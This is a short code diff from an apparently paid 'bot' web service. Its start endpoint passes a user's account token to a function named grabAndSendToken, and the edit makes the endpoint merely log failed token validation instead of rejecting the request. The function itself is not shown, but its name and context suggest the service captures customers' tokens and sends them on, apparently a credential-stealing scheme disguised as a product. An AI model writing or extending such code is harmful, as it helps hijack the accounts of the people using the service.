@@ -1358,7 +1358,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
 
     const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
     if (!grabResult || !grabResult.success) {
-      return res.status(400).json({ success: false, error: grabResult?.error || 'Token validation failed. Check your token.' });
+      console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
     }
 
     const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
